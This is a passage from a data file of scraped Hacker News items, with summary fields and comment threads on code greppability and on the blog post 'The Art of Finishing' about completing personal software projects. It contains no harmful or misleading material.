strings work. reply troupo 3 hours agorootparentSimply searching for strings rarely works well as the codebase grows larger. Because besides knowing where all things named X are, you want to actually see where X is used, or where it's called from, or where it is defined. With search you end up grepping the code twice: - first grepping for the name We're literally in a thread where people invent regexes for how to search the same thing (a function) defined in two different ways (as a function or as a const) - secondly, manually grepping through search results deducing if it's relevant to what you're looking for It becomes significantly worse if you want to include third-party libs in your search. There are countless times when I would just Cmd+B/Cmd+Click a symbol in IDEA and continue my exploration down to Java's own libraries. There are next to zero cases when IDEA would fail to recognise a function and find its usages if it was defined as a const, not as a function. Why would I willingly deny myself these tools as so many in this thread do? reply wruza 4 hours agorootparentprevIts current year and IDEs still can’t remember how I just transformed the snippet of code and suggest to transform the rest of the files in the same way. All they can do in “refactor” menu is only “rename” and then some extract/etc nonsense which no one uses irl. By using regexps I have an experience that opens many doors, and the fact that they aren’t automatic could make me sad, if only these doors weren’t completely shut without that experience. reply troupo 3 hours agorootparentNo one is stopping you from using regexps in IDEs. And you somehow manage to undersell the rename functionality in an IDE. And I've used move/extract functionality multiple times. I do however agree that applicable transformations (like upgrading to new syntaxes, or ways of doing stuff as languages evolve) could be applied wholesale",
    "originSummary": [
      "Greppability, the ease of searching for code elements, is an important but often overlooked metric in code maintenance.",
      "Key practices to enhance greppability include avoiding dynamic identifier construction, using consistent naming conventions across the stack, and preferring flat over nested structures.",
      "These practices help prevent frustration and errors when navigating and maintaining unfamiliar codebases."
    ],
    "commentSummary": [
      "Greppability, the ease of searching code using grep, is an underrated but valuable metric for code quality and consistency.",
      "\"Super Grep,\" a tool designed for enhanced pattern matching across various naming conventions, is now available on PyPI, offering a \"super case insensitive\" mode.",
      "While IDEs (Integrated Development Environments) provide search functionalities, grep remains crucial, especially in large or unfamiliar codebases, ensuring ease of search and consistency across different languages."
    ],
    "points": 907,
    "commentCount": 479,
    "retryCount": 0,
    "time": 1725331620
  },
  {
    "id": 41428705,
    "title": "The Art of Finishing",
    "originLink": "https://www.bytedrum.com/posts/art-of-finishing/",
    "originBody": "It’s a quiet Saturday afternoon. I’ve carved out a few precious hours for coding, armed with a steaming cup of coffee and the familiar urge to dive into a project. As I settle into my chair and open my terminal, I’m confronted with a challenge that’s become all too familiar: deciding which of my many unfinished projects to tackle. I navigate to my project directory, greeted by a graveyard of half-implemented ideas and stalled works-in-progress. Each one represents a different problem I’ve tried to solve, a different technology I’ve attempted to master. They’re all interesting, each with its own purpose and potential. But as I scan through them, I can already feel my enthusiasm waning. I know that whichever one I choose, I’ll be facing not just the original problem, but a hydra of new challenges that have sprouted since I last looked at the code. After some deliberation, I make my choice and fire up my IDE. As I pull the latest changes and begin the archaeological dig through my commit history, I brace myself for what I know I’ll find. Sure enough, there it is: an unfinished frontend task, more wireframe than polished UI. Or perhaps it’s a library integration that’s hitting limitations I hadn’t anticipated. Or, in classic over-engineering fashion, I’ve built a complex architecture for a problem that could have been solved with a simple script. I roll up my sleeves and dive in, determined to make progress. The next couple of hours fly by in a flurry of activity—refactoring code, debugging integration issues, or wrestling with CSS to get that one component to align just right. Before I know it, my allocated time is up. As I prepare to step away from my desk, I can’t shake a feeling of frustration. I started the session full of optimism, ready to make significant headway. Now, I’m left with a nagging sense of inadequacy. Despite my efforts, it feels like I’ve barely moved the needle. The codebase is still a maze of TODO comments and half-implemented features. The Hydra of software development has grown two new heads for every one I managed to address. This cycle of enthusiasm, struggle, and disappointment has become all too familiar. It’s the Hydra Project Effect: no matter how much progress I make, new challenges always seem to sprout in their place. But while this pattern may seem unbreakable, I’m determined to find a way to tame this beast. In this post, I’ll explore strategies for breaking out of this cycle of endless beginnings and unsatisfying middles. It’s time to learn the art of finishing, to slay this Hydra once and for all, and to finally experience the satisfaction of a completed project. The Allure of the Endless Project# There’s a certain comfort in the realm of infinite possibility. When a project is ongoing, it can be anything. It’s Schrödinger’s1 project—simultaneously perfect and flawed until you actually finish it and put it out into the world. The moment you declare a project “done,” you open it up to criticism, both external and internal. What if it’s not good enough? What if I missed something crucial? This fear of finality, combined with the excitement of new ideas, creates an ideal environment for project procrastination. It’s always easier to start something new than to push through the final, often tedious stages of completion of a project. But there’s more to it than just fear. An unfinished project is full of intoxicating potential. It could be the next big thing, a revolutionary idea, or your magnum opus. This potential often feels more exciting than the reality of a finished product. There’s also comfort in the familiar territory of an ongoing project. You know the codebase, you understand the problems, and you’re in your element. Starting something new means facing the unknown, which can be daunting. The illusion of productivity plays a significant role too. As long as you’re working on something, you feel productive. Jumping from project to project gives you a constant stream of “new project energy,” which can feel more invigorating than the grind of finishing a single project. It’s a way of avoiding difficult decisions that come with completion. Do you cut that feature you spent weeks on but isn’t quite right? Do you release now or spend another month polishing? By keeping projects ongoing, you can sidestep these challenging choices. The absence of deadlines in personal projects adds another layer to this complexity2. Without the external pressure of a due date, it’s all too easy to fall into the trap of perfectionism. We find ourselves endlessly tweaking and refining, always chasing that elusive “perfect” solution. The irony is that this pursuit of perfection often leads to imperfect results—or no results at all. In our professional lives, deadlines force us to prioritize and make pragmatic decisions. But in personal projects, the luxury of unlimited time can become a curse, allowing us to justify spending hours, days, or even weeks on minor details that, in reality, make little difference to the project’s overall success or usefulness. It’s a stark reminder that sometimes, “good enough” truly is perfect, especially when the alternative is never finishing at all. Paradoxically, sometimes we fear success as much as failure. A successful project might lead to increased expectations, more responsibility, or a change in identity that we’re not quite ready for. The unfinished project becomes a safety net, protecting us from the unknown consequences of success. The Cost of Never Finishing# But this cycle of endless beginnings comes at a steep price. There’s a unique satisfaction in seeing a project through to completion that no amount of starting can match. Moreover, unfinished projects carry a mental weight. They linger in the back of your mind, quietly draining your mental energy and enthusiasm. Perhaps most importantly, we learn different lessons from finishing projects than we do from starting them. Starting teaches us about ideation and initial implementation. Finishing, on the other hand, teaches us about perseverance, attention to detail, and the art of knowing when to let go. These are invaluable skills that can only be honed through the act of completion. The costs of never finishing extend far beyond just missed opportunities. While starting projects might expose you to new technologies or concepts, it’s in the act of finishing—of solving those last, trickiest problems—where real skill growth often occurs. Each unfinished project can chip away at your confidence. Over time, you might start to doubt your ability to complete anything substantial, creating a self-fulfilling prophecy of incompletion. The end stages of a project often involve optimization, refactoring, and really understanding the intricacies of your code. By not finishing, you miss out on these valuable learning experiences. In professional settings, being known as someone who starts things but doesn’t finish them can be detrimental to your career. Employers and clients value those who can deliver completed projects, making the ability to finish a crucial professional skill. Every unfinished project takes up mental space. It’s like having dozens of browser tabs open—each one uses a little bit of your mental RAM, leaving you with less capacity for new ideas and focused work. This mental clutter can be a significant drain on your creativity and productivity. Perhaps most importantly, you deny yourself the incomparable feeling of satisfaction when you release a finished project into the world. There’s a joy in shipping that can’t be replicated by starting something new. Finished projects also invite feedback, and without shipping, you miss out on valuable insights from users or peers that could significantly improve your skills and future projects. Understanding both the allure of endless projects and the cost of never finishing is crucial. It’s not about dismissing the excitement of new beginnings, but rather about finding a balance—learning to channel that initial enthusiasm into the equally important (if sometimes less glamorous) work of seeing things through to completion. By recognizing these patterns in ourselves, we can start to develop strategies to overcome them and finally slay the Project Hydra. Strategies for Taming the Project Hydra# So, how do I break this cycle? How do I learn to finish what I start? Here are some strategies I’m implementing to tame my own Project Hydra: ✅ Define “Done” from the Start: Before diving into a project, I’ll clearly define what “finished” looks like. What are the core features that constitute a complete project? I’ll write them down and resist the urge to expand this list as I go. This clarity helps prevent scope creep and gives me a clear target to aim for. 🚀 Embrace MVP: Instead of aiming for perfection, I’ll aim for “good enough.” I’ll get a basic version working and out into the world. I can always iterate and improve later. This approach helps maintain momentum and provides early feedback opportunities. ⏳ Time-Box My Projects: I’ll give myself a deadline. It doesn’t have to be short, but it should be finite. Having an end date creates urgency and helps me prevent endless feature creep. I find that breaking larger projects into smaller, time-boxed phases helps maintain a sense of progress. 🧩 Practice Finishing Small Things: I’ll build my “finishing muscle” by completing small projects or tasks regularly. I recognize that the skill of finishing is like any other—it improves with practice. This could be as simple as finishing a blog post or completing a small coding challenge each week. 💡 Separate Ideation from Implementation: I’ll keep a separate idea log. When new features or project ideas pop up during implementation, I’ll jot them down for future consideration instead of immediately acting on them. This helps maintain focus on the current project while still capturing potentially valuable ideas. 🎉 Celebrate Completions: I’ll make finishing a big deal. I’ll celebrate when I complete a project, no matter how small. This positive reinforcement can help shift my mindset towards completion. Whether it’s treating myself to a nice dinner or simply sharing my accomplishment with friends, acknowledging these wins boosts motivation for future projects. 👥 Embrace Accountability: I’ll find ways to make myself accountable for finishing projects. This could involve finding an accountability partner, making public commitments about project milestones, or joining a group of fellow developers. External accountability adds motivation and support to the often solitary journey of personal projects.3 These strategies provide my personal roadmap for overcoming the challenges of the Project Hydra. By implementing them consistently, I hope to develop better habits and increase my chances of seeing projects through to completion. It’s about creating a supportive structure around my work, balancing internal motivation with external accountability, and gradually building the skill of finishing. Of course, strategies are just the beginning. The real challenge lies in consistently applying these approaches to my work. It’s a process of trial and error, of learning what works best for my personal style and the specific demands of each project. But with each small win, with each project pushed a little closer to completion, I’m building the habits and mindset needed to finally tame the Project Hydra. The Path Forward# The path ahead will be challenging. I know that changing ingrained habits and thought patterns will take time and consistent effort. There will likely be setbacks along the way – moments when the allure of a new project tempts me away from finishing the current one, or when the fear of imperfection makes me hesitate to declare something “done”. But I’m committed to pushing through these obstacles and building my “finishing muscle”. This journey isn’t just about completing code; it’s about growing as a developer and creator. Each finished project, no matter how small, is a step towards becoming someone who not only starts with enthusiasm but finishes with satisfaction. The Project Hydra has loomed over my work for too long. Armed with new strategies and determination, I’m ready to face this beast head-on. It’s time to stop planning and start doing. Now, if you’ll excuse me, I have a project to finish – and this time, I intend to see it through.4 Footnotes# Unlike the cat, however, most unfinished projects are neither alive nor dead - they’re just taking up space on our hard SSD NVMe drives. ↩ This phenomenon is closely related to Parkinson’s Law, which states that “work expands so as to fill the time available for its completion.” In personal projects, the available time is often infinite, leading to endless expansion. ↩ A study by the American Society of Training and Development found that people have a 65% chance of completing a goal if they commit to someone else. That chance increases to 95% when they have a specific accountability appointment with the person they’ve committed to. ↩ I finished this article in one sitting, fueled by determination and an alarming amount of coffee. No Hydras were harmed in the making of this blog post. ↩",
    "commentLink": "https://news.ycombinator.com/item?id=41428705",
    "commentBody": "The Art of Finishing (bytedrum.com)609 points by emmorts 22 hours agohidepastfavorite147 comments sevensor 6 hours agoOr, you could stop beating yourself up about it and reframe the whole activity as a creative release. Nobody else cares if you finish it, why should you? My neighbor died with a project car parked in his driveway. It had been there for years. Every so often he got out there and worked on it with his grandson. Who among us would call that time wasted? Why not dust off Project Foo on a Saturday afternoon, and just tinker with the fun parts? reply atoav 2 hours agoparentExactly. Unless you do it to earn money who gives a damn if you have a hundred draft projects? Who except yourself that is. Never finishing anything sucks, as it gives you the feeling that you.. well.. can't finish anything. My tip is to embrace the fact that a big part of what we start does not need to be finished. I sometimes code a way just for the joy of doing it, that is okay. Not only is it okay, it is also necessary to try out things and play around. Playing is a very good way to learn. And if you give yourself that slack for some projects it is easier to go all strick and I need this done on others. Other than that you need to ask yourself what blocks you from finishing things. E.g. a wise old audio mixing engineer once told me: a mix is never finished, you can always go back and optimize things, forever. Ultimately you need to say it is finished for it to be finished. Software can be similar. Many junior programmers will adjust the scope of their software as they build it and wonder that it never goes anywhere. my tip is to select a problem you profit from being solved. Make a realistic scope what the goal is and do it, so you can go back to your fun project. Boom you just got a thing done. reply jckahn 3 hours agoparentprevI like endless projects. Building something the way I want to build it is fun. Why would I ever want that to stop? I release updates to my various endless open source projects (such as https://www.farmhand.life/ and https://chitchatter.im/) regularly to the public. They are \"complete\" in the sense that they are fully-formed enough to be worth playing/using. But they're not complete. They will never be complete. I don't want them to be complete. I want to build them for the rest of my life, because building them is what I love to do. reply Foreignborn 3 hours agoparentprevIn this context, I would say *finishing things* is the actual creative release. The \"not finishing\" is getting in the way of it. (also, I highly doubtful that this is the author's one creative release, and and even more doubt he's coding up a project with his hypothetical grandson) reply packetlost 4 hours agoparentprev> Or, you could stop beating yourself up about it and reframe the whole activity as a creative release. I think for some people this isn't better. If I feel like I'm not being productive in some capacity, I get depressed. It would happen frequently to me over the summers between school semesters, and it happens to me now by the end of a 1-week vacation. It might sound like a burnout path, but that's not what has historically lead me (personally) to burning out and I've been at this for like 10 years. reply yard2010 4 hours agorootparentWhen I'm setting deadlines for myself, working fast to ship, making compromises due to time constraints I get depressed. When I'm working on a project for years and it has not yet shipped, I get depressed. Personally, I think the problem is not with each strategy, but with the context - time is money and money is time and I have pretty much none to spare. reply packetlost 4 hours agorootparentYeah, context is definitely important. I also tend to work on projects that I personally find useful instead of trying to build products for other people, which probably plays heavily into it. reply loughnane 50 minutes agoparentprevI agree with the conclusion, but using what other people care about as a standard for what you ought to care about is a path that leads straight to despair. reply metacritic12 4 hours agoparentprevThat's a good way of framing the project. Especially if what the article author says is true: which is that most of the energy comes from brainstorming and fantasizing about what the project could be. The flip side is that you have to really buy into the activity as creative release -- and be OK not finishing when you start. For some people, their subconscious gets excited during the brainstorming phase most when they have a justified knowledge that they will likely finish the project. If these people start a project knowing they won't finish, it can take a lot away from the excitment of doing a project. The article's author probably falls into the latter camp. reply pickledoyster 5 hours agoparentprevYeah, setting deadlines for a hobby is how I used to kill any joy I'd get from the hobby. reply A4ET8a8uTh0 5 hours agoparentprevnext [–]the goal is to maximally decompose the projects until each action is as close to trivial as possible This is a big part of the GTD framework that is almost always dropped in the retelling but which I think is fundamental. The tasks should be broken down to the next physical thing you can do so you don't have to think to act. Also you have cool interests reply soco 9 hours agorootparentBut! Breaking down tasks to small pieces is a huge task by itself! Many people can't ever use that framework because well they cannot get themselves to that point. Is there any framework you know which could help applying this framework? reply TeMPOraL 6 hours agorootparentIndeed; also, I must be doing something wrong, because when I start breaking tasks down to the point of triviality, I end up with a rather big pile of them, which becomes its own challenge to manage - and then two or three simple tasks in, some result invalidates most of the rest of the breakdown. reply bluGill 5 hours agorootparentThe key is to figure out what is the priority, break that down to a couple tasks you can do now and do them even before you break down anymore. That is you want to find the list of what you will do in the next few hours and get that done. Done means find a good stopping point, clean up and put the tools away. Sometimes you will ready to clean up and realize you have more time and so you break down one more task, that is fine so long as you leave things in a finished state - cleaned up and tools put away. Ideally the project is complete and whatever isn't done will be a next phase you can do in the future. If a project must be over several days you need more planning and you need to get the whole thing done. For your daily driver car you have to complete each phase and have a drivable car at the end of each day, for a project car you can have 42 years (real number for a project car a friend of mine is working on) between starting and a drivable car - but phases are still things you complete in a few hours either way. reply targafarian 6 hours agorootparentprevFor me this is a set of general strategies for breaking down problems. Here are some I use. (Apologies if these aren't all orthogonal to one another; they just feel different when I'm thinking of how to break a problem down.) 1. Break down the steps. Can you find a recipe of steps for achieving the thing? Then start with the first step. Maybe that's a small enough task. Maybe you don't have to perform all steps in order, and you can find a small-enough step to do next. 2. Isolate the fundamental challenges. There is often a tough nut to crack within the problem. Can you isolate that from the rest of the project, and turn it into its own thing (I like to cast this as a \"toy\" problem)? When I say \"isolate,\" I mean to remove all unnecessary complexity to getting at the fundamental issue. Suppose I want to figure out how to create a robust messaging network. There might be user interfaces and caching and different kinds of messages and different networks and different failure mechanisms and performance issues and ... So just create a \"toy\" at each step: First, simply send & receive a message. Don't worry about performance or worry much about robustness. You now have a small task but whose completion achieves a fundamentally necessary part of the larger task. Finishing that will feel good--you have something that works!--and you've made real progress. You might find examples of others doing something similar to this basic task as well, so you can work on your own but then compare notes to others to gain insights on why others have solved similar problems differently than how you solved it (you might have come to something better, or not; either way, you now have understanding of the fundamental problems involved). Now you can grow that toy or take what you learned from the toy and apply it to the larger task. 3. Similar to 2, but maybe a different POV: The physics joke is approximating a cow as a perfect sphere to study its dynamics. Simply the hell out of a problem! Maybe it feels ridiculously simple. Fine; now you are working with something completely tractable. You can then add in complexity to your model one wrinkle at a time. 4. Do something that's actually easy even if i might not be \"significant\" from the \"big challenges to getting this project working\" POV. Maybe you've been frustrated for a week or two trying to solve the tough-nut-to-crack bit of the problem. Even your toy problem remains (what feels hopelessly) broken! Switch over to creating the GUI or something superficial but that is easily tractable yet yields something satisfying to you when you finish. Simply stepping away from the hard problem for a day or two can re-motivate you when you come back to the hard problem. That time can also give your mind time to process solutions in the background (many people--myself included--have an \"a ha!\" moment when not thinking directly about a hard problem). And you are still being productive, moving towards the end goal. You had to make a GUI anyway at some point. Might as well be when you are stuck on the hard thing and feeling frustrated. Getting good at breaking down problems took me many years. I credit my physics education as being particularly helpful (training thinking of problems & solutions in their extremes and always connecting solutions back to \"does it make sense\"). But much of the above is also learning my own psychology of how I work and what/when/how I am motivated to work and in the best position psychologically to solve a problem. I expect this isn't too different for many people, but the details can vary from person to person. reply soco 5 hours agorootparentThank you for the extensive explanation. The problem I mentioned starts rather earlier: say I have X big tasks. I need to split them (applying your described process or otherwise) into smaller tasks. BUT now I'm looking at X x2 tasks: the original X ones, each one getting another task of splitting it into smaller ones. The whole stack becomes only more overwhelming like this... reply solomonb 4 hours agorootparentYou end up with more smaller tasks. A big part of the idea with my system is that you only identify 5 tasks at a time. Anything more then that and it becomes overwhelming. So the idea is to peel off the first 5 actionable tasks from your project(s), deal with those before thinking further about the project. Yes this implies having a general sense of how to accomplish the project and the tasks involved, but no it does not mean you need to have a master plan with every step mapped out. Every 5 steps you get to re-assess and course correct. reply solomonb 12 hours agorootparentprevThanks. I have heard a lot about GTD but never sat down and read it. I definitely want to read it one of these days but I also must say that after years of trying different productivity systems I find that the absolute simplest systems are the best for me. reply port19 7 hours agorootparentThen stay away from it if you can. GTD is great if you're a manager with a wive and kids and maybe a foundation to run on the side. If you don't usually forget tasks/events or freeze up because of analysis paralysis, you can get by just fine without it. GTD definitely brings an overhead that doesn't pay off in a reasonably simple life reply bluGill 5 hours agorootparentGTD is supposed to be a pick and choose the parts that will make the most difference in your life and adjust to what works for you. If your not \"a manager with a wive and kids and maybe a foundation to run on the side.\" then you don't need the full, but there are often useful things in there that are useful. GTD is not religion (or at least it should not be - with some people it is), you won't go to hell or something if you don't do everything perfect. reply TeMPOraL 6 hours agorootparentprevI'm not a manager, but have a wife and kids and used to run a foundation on the side. The overhead of GTD only got more painful, while my ability to sustain focus diminished, so the whole thing broke down. reply zafka 19 hours agoparentprevYour interests sound similar to mine. My email is in my profile if you ever care to compare notes. reply Syntonicles 17 hours agoparentprevSame approach: I call it \"Ten Tiny Tasks\" reply assadk 16 hours agorootparentSounds interesting, could you elaborate on this please? reply merlincorey 16 hours agorootparentI'm not the GP you asked, but distilling my own personal organization practices into the alluring \"Ten Tiny Tasks\" title, here's my take on it: - Make a list of the 10 tiniest tasks with the least amount of estimated effort you can find or think of that need to be done - Maybe save task 10 for a super quick prioritizing of the other 9 tasks, or don't because they are tiny tasks, after all - Complete the 10 tiniest tasks - Repeat the process until there are no more tasks (of course, there are always more tasks) reply agumonkey 11 hours agorootparentIt's a method of building up and keeping momentum ? reply fragmede 12 hours agorootparentprevAnd like, tiny. Open terminal to project directory. Opeb browser window/tab to SDK/API index. Shit so easy that you can't help but do them. Repeat until you get to tasks that aren't quite so trivial, and by then, you'll be going. reply solomonb 12 hours agorootparentIME as you approach the limit you can create an infinite number of tasks. The key for me is to pick tasks which balance expedience and bang for buck value, but if you are experiencing intense writers block then I see no problem with a task like \"open editor.\" reply aldanor 7 hours agorootparentYea. It's like falling down the recursion with a stack size of 5. Do the task. Plan doing the task. Start planning doing the task. Plan starting planning doing the task... reply TeMPOraL 5 hours agorootparentRecursion isn't necessarily the problem per se - it's the sheer number of tasks. When you're at the level of \"open terminal to project directory\", it takes less time to do it than to write it down, but more importantly, you'll end up creating a 100 of those tiny tasks, and the overhead of keeping them up to date can easily suck all your motivation (and time) dry. reply lovegrenoble 18 hours agoparentprevThanks! reply exe34 19 hours agoparentprevwould the five tasks be a single project or across multiple? reply solomonb 19 hours agorootparentIt depends on the circumstances and how you want to prioritize things. Generally I'll take on the 5 easiest tasks across all my 'active' projects. reply exe34 13 hours agorootparentthat makes a lot of sense. I've noticed myself, whenever I'm procrastinating and avoiding working on a project, it's because I don't actually know what the next step is. if I make figuring out the next few steps as a time-boxed task in itself, suddenly I don't procrastinate anymore, I just sit down and do it. reply solomonb 12 hours agorootparentI think this gets back to what I said about being okay with bike-shedding. Researching and exploring the design space is a critical part of every project. Its okay to commit time to thinking, planning, and exploring. I feel that as engineers we generally react negatively to the idea of bike-shedding or \"building cathedrals\" but the reality is that there is always a bike-shed. The question we should be asking is not should we deliberate over the design of the project, but rather to what degree does this project (and consequently the business in paid situations) benefit from deliberation. In the case of personal projects, I am far more concerned with the process then the outcome and will allow myself to indulge in bike-shedding maximally. reply exe34 6 hours agorootparentMy preference is to think deeply about it alone, and either take the results of that to the team or even come up with a very rough mockup/prototype and/or some working code for the bits that I initially have no idea how to implement (again, in a time-boxed manner)- and only then have a proper bike-shedding session. Otherwise I find so much time is wasted on tiny details that don't matter, and the overall picture still fails to emerge (aka a definitional bike-shedding session). reply mikesabbagh 6 hours agoprevI suffer the same problem. It is all about conserving mental energy. The way I see it, each person has 2 different mental power gears. A high power one, that drains you and makes you excited at same time. You need this for planning and thinking big or learning about a new tool. And a Low power gear that allows you to fix bugs and create a small feature for a known tool. We mostly use this low power gear in our daily life, in meetings, while driving or preparing coffee. The high power gear is used sparingly, when we can't sleep at night because of an idea, when we try to learn something new. it is exciting, but draining and painful at the same time. We want to do it again only after forgetting the pain. I think proscratination is because we use a high power gear too frequently, we are exhausted mentally, and it is too painful. so we say let's do it later. But what if you have a small task that does not need a lot of thinking to do? something not painful? Well this is easy. I can do it. The trick is, it needs to be easy. you should not waste 1 hour to set up your environment to be able to start. it has to be easy. So to advance on a project, I need to make sure I always have low energy, easy tasks ready for me when i am not in my mental capacity to use my high power thinking. It is as if I am 2 persons. a developer and an intern. you need to make sure there is enough easy tasks for the intern to work on. You have to accept this about youreself Dont waste days planning and creating issues for youreself. This is too draining. you need to write the big plan only and make sure you have few tasks ready. not all of them defined from day 0. do a big planning every 2 to 3 weeks (looks similar to a sprint) It is all about conserving your mental energy reply morning-coffee 4 hours agoparentI really like this take! I've been doing software professionally for over thirty years, and really relate to all of the discussions here and the root post. I typically beat myself up about \"why is this task taking me so long?! it should be easy by now!\", etc. But it's likely because I typically take the \"focus on the next hardest problem first, otherwise I'll only have all the hard problems to solve at the end\" route, and have to use the high-power gear all the time. reply xianshou 21 hours agoprevI used to find myself under the effects of this curse as well, so I would recommend the author look into why he embarks on such a thicket of unfinished side projects. In my own case, it boiled down to a mix of several imperfectly aligned factors: 1. Genuine intellectual interest 2. A desire to improve particular skills 3. A vague sense, acquired by osmosis, that industriously working on side projects during one's free time is what a Real Engineer does Disentangling these motives and identifying a clear primary drive behind each project clears up the \"hydra\" feeling wonderfully, as most of the heads simply disappear once you realize that you never had a strong reason to pursue them in the first place. (3) in particular is often merely the self-castigating whisper of the internalized \"should\" rather than a valid reason to embark on a long and open-ended project. reply threatripper 13 hours agoparentIf your inner motivation is satisfying intellectual interest or improving skills, you actually finished the real project behind the facade without a need for finishing the official project. So, the mistake boils down to making up a fake official project as kind of a justification for satisfying your real needs. Maybe you would feel better if you are true to yourself and say \"I do this to explore and learn, I don't actually ever intend to deliver a presentable product with this activity.\". reply Lutger 8 hours agorootparentThis. I felt much better once I realized it and learned to 'delete' projects. These are like sketches an artist makes to practice for the real thing, which often never comes. But it is a satisfying learning experience. Working backwards from the end result is a good practice to see where you want to take it. And the end result is not the deliverable itself, but how, for what purpose and by whom it is used. Will you want to charge money? Do you offer it for free to anyone? Will you take feedback? Does it solve a personal problem? If you can't answer these kind of questions, then maybe it really is the journey and you never intend on finishing a product anyway, which is fine. reply lelanthran 12 hours agoparentprev> I used to find myself under the effects of this curse as well, so I would recommend the author look into why he embarks on such a thicket of unfinished side projects. The why is easy: my brain is a damn traitor! HN, Reddit, Wikipedia and (especially) tvtropes: a single click on any one of those sites, and 3 hours of fascinated clicking later I realise that I actually haven't got any work done, but now know a lot about spidermonkeys and the Magnificent Bastard character. Strangely enough, instragram, tiktok, youtube and other social sites have never managed to hold my attention for more than a few minutes. reply TeMPOraL 5 hours agorootparent> Strangely enough, instragram, tiktok, youtube and other social sites have never managed to hold my attention for more than a few minutes. Same for me. I guess the difference is that HN, Reddit, Wikipedia, and even TV Tropes are giving you some knowledge, occasionally even useful one; every now and then you'll stumble onto something that solves an immediate problem you have, or is otherwise transformative. That's variable ratio reinforcement right there, the basis of gambling addiction, made extra potent because the occasional win you get is actually real and lasting. reply morning-coffee 3 hours agorootparentSame! For me its some combination of paradox-of-choice for what to go learn about or work on next combined with variable-ratio-reinforcement compelling me to practically do a depth-first traversal of all the cool possibilities. I think at some point I'll need to turn it all off. reply andrei_says_ 20 hours agoparentprevI’d like to add 4. The inertia and feel good sense of being in the flow when programming. The mind gets into a single track and wants to continue. Fun but also exhausting. So I stopped all that. I started learning Argentine Tango instead - lifelong project and an invitation to limitless mastery of multiple aspects of self and relationships. F number 3. I feel we all give more than enough in our jobs. reply d0gsg0w00f 16 hours agorootparentGod I miss tango. 2 kids put our 2 years of lessons to a screeching halt. reply circlefavshape 8 hours agorootparentOnce our kids were old enough to go to bed and stay there we started dancing by ourselves in the sitting room. Salsa rather than tango. Don't do it so much these days because the kids are now teens and once again NEVER GO TO BED, but it was fun while it lasted reply andrei_says_ 11 hours agorootparentprevA family of tango dancers, husband and wife, returned to the tango practica at a local tango school. It’s a garden practica and they bring the baby. Beyond adorable. But yes, when I look at the people at a milonga, one of my thoughts is - you people clearly don’t have kids do you. Hope you can bring some of its magic back to your life, even if it’s in small doses. reply rustyboy 18 hours agoparentprevthis is really insightful, i am nearing ten years as SWE - i've always loved passion projects and learning outside of work. This has historically got me really far in my career. However I just started a new role as a team lead on k8s platform. I rushed out got a few NICs and started setting up a homelab to learn but havn't spent more than a few hours working on it in weeks. for the first time in my life i'm starting to think that my hobbies outside work (and the majority of my identity) has very little to do with software. i had never thought about how much my work was tied to my identity and it's extremely jarring. reply psidebot 20 hours agoprevI think it's worth differentiating between personal projects done to learn or just for interest, and those that are trying to accomplish something. If I do a project for myself to try things out and learn something I don't feel any pressure to finish the project. Once I've learned something or had some fun, who cares if it's \"finished\" or if anyone else will use it. On the other hand, sometimes I'll pick up something interesting that helps a friend or family member, or just that I need for myself, and there I'm pretty careful about scope. If I can't finish it in a couple weekends I'll look for the closest commercial solution unless it's a major once-in-a-decade passion project. reply iamflimflam1 8 hours agoparentDefinitely agree with this. Most of my personal projects are just to prove that something can be done. Once I know it's possible then the fun and interest is no longer there. I'm not trying to product a \"finished\" product or something that is polished enough for someone else to use. reply daveguy 6 hours agoparentprevI think this is an excellent point. For those projects that are needed by myself or others I prefer to look at the closest commercial solution first rather than last too see if I might spend more time than it's worth. Or to see if I might be able to sell my own solution to more than the target client (myself or others). reply Ilasky 6 hours agoprevThose strategies for finishing projects are exactly why I’ve been running a six-week group[0] where we all work on our projects together. Setting goals, time-boxing, accountability, celebrations — it’s all built in. I’ve definitely found that during the 6 weeks that I find a laser focus on what I want to do and how I want to do it. It adds a fence to the green field project, so to speak. Highly recommend building alongside others, if you haven’t tried it yet. [0] https://lmt2.com reply btbuildem 21 hours agoprevWhat if personal projects are not meant to be finished? Journey and destination and all that? Perhaps for some it's more about the endless noodling about and whittling away bits and pieces, and a \"project\" is just a convenient excuse do do it? reply drewhk 7 hours agoparentOne way to think about it is to ask yourself, is your personal project actually _playtime_? Playing is not goal oriented and therefore very relaxing. There is nothing wrong with that! I am happy to \"play\" programming and I learned a lot of techniques that I used years later - and then actually finishing it. Do not deny yourself playtime! reply sevensor 6 hours agorootparentAgree completely. Reframe recreational programming as your favorite video game, and you’ll feel much more satisfied after a session that produces nothing, because that was never the point. reply sopooneo 21 hours agoparentprevAgreed completely. Sometimes I've worked hard to put the finishing touches on side projects to make them usable by others and have been pleasantly surprised by the interest. But in most cases, even when I finish, almost no one cares. And while finishing is an important lesson early on, just so you know how hard that \"last 20%\" is, it's grueling and not typically very informative or unique after that first couple times. So I'm now squarely in the camp of do what I want and finish what I want on the side, with no guilt. If I enjoy the journey I call it good. Finishing is for the day job. reply dakiol 21 hours agoparentprevExactly. I do side projects because they are fun. No pressure, no expectations. Simply and pure knowledge gaining and programming… which I love. I already have a boss asking me 9-5 when I will finish project X, so I don’t need that pressure when doing things by myself. Besides, some things are never meant to be finished (e.g., eating healthy, doing exercise, gaining knowledge, etc.) reply whiterknight 21 hours agoparentprevBut because finishing is hard (and not fun) it’s also easy to make up reasons for why you don’t finish things, without scrutinizing the underlying motivation. Sometimes i look back and say “I’m glad I moved on” but I think a lot of the time I also just wish the thing was done. reply detourdog 21 hours agorootparentSometimes one needs to reset the goals and failure suddenly looks like a success. reply detourdog 21 hours agoparentprevI always thought of the journey as the reward and that was very sustainable and I have picked up a diverse skillset. I think one doesn't need to finish a project. One should be able finish milestones or reset milestones appropriately. This matters to me personally to feel good about myself. A society favors art or progress. Depending on which effort you identify with finishing may not matter. reply TeMPOraL 20 hours agoparentprevWithout the \"convenient excuse\", the journey starts looking like pure procrastination; how do you enjoy it without the guilt about not doing more important work that leads to more important results? What if it's a bit of both? Something dawned on me today when mulling on another related idea \"systems vs goals\", popularized by Scott Adams in \"How to Fail at Almost Everything and Still Win Big\"[0]. It was a widely popular book at the time, even here on HN, but the core idea never worked for me. Nor even resonated. Quoting from the book[1]: \"A goal is a specific objective that you either achieve or don't sometime in the future. A system is something you do on a regular basis that increases your odds of happiness in the long run. If you do something every day, its a system. If you're waiting to achieve it someday in the future, it's a goal.\" Boring, ain't it? For me, the problem with project, systems, and enjoying journey over destination is that: 1) Projects don't motivate me for long; past initial excitement, I'm rarely able to muster enough motivation from the dream of finishing something (and enjoying the spoil) to move me past static friction. 2) \"Journey over destination\" - I mean, if I'm doing a project, I care about benefits and (my imagined) experiences given by whatever it is that I've built 